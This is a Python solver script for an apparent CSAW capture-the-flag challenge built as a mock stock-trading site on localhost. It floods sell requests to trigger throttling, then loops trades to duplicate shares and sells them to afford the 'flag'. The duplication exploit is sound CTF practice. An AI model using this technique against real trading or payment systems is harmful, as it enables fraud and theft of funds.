import requests
import json
from time import sleep
import random

ADDRESS = "http://127.0.0.1"
PORT = 4657

print(\
"""Thank you for choosing City Subway Auction Website (CSAW)'s Trading Platform
As a thank you for using our platform, all new registrants will be granted $2000
and the flags are on sale for $9001 dollars. Have fun trading!

Here are the options:

Login and register with ID

1. List Account Status
2. Buy Stocks
3. Sell Stocks
4. Trade Stocks
5. Buy flags at $9001


""")

def inp() -> str:
    print(">", end="")
    return input()

def sendGET(subpath) -> str:
    try:
        response = requests.get(ADDRESS + ":" + str(PORT) + subpath)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None


def sendPOST(subpath, data) -> str:
    url = ADDRESS + ":" + str(PORT) + subpath
    payload = data

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None

def buyStock(key, str):
    body = sendPOST("/buy", {"key":key, "stock": str})
    return body

def sellStock(key, str):
    body = sendPOST("/sell", {"key":key, "stock": str})
    return body

def tradeStock(key, str, str1):
    body = sendPOST("/trade", {"key":key, "stock": str, "stock1": str1})
    return body

def listCalls() -> str:
    body = sendGET("/listCalls")
    out = json.loads(body)
    return "\n".join((str(i["name"]) + " at " + str(i["price"]) for i in out.values()))

def flag(key) -> str:
    body = sendPOST("/flag", {"key":key})
    return body

def status(key) -> str:
    body = sendPOST("/login", {"key":key})
    return body

print(listCalls())

print()

print("Please login")
#key = inp()
key = "Strappedon_Orkmont" + str(random.randint(0,155))

#start by purchasing one share of
#BURPSHIRE HAT
buyStock(key, "BURPSHARKHAT")

#then induce throttling
for i in range(30):
    print(sellStock(key, "ELONX"))

#then dupe
for i in range(20):
    print(tradeStock(key,"BURPSHARKHAT", "BROOKING"))
    print(sellStock(key, "ELONX"))
    print(status(key))

#let the timeout clear a bit
sleep(10)

#then dump calls
for i in range(20):
    print(sellStock(key, "BROOKING"))

#flag
print(flag(key))
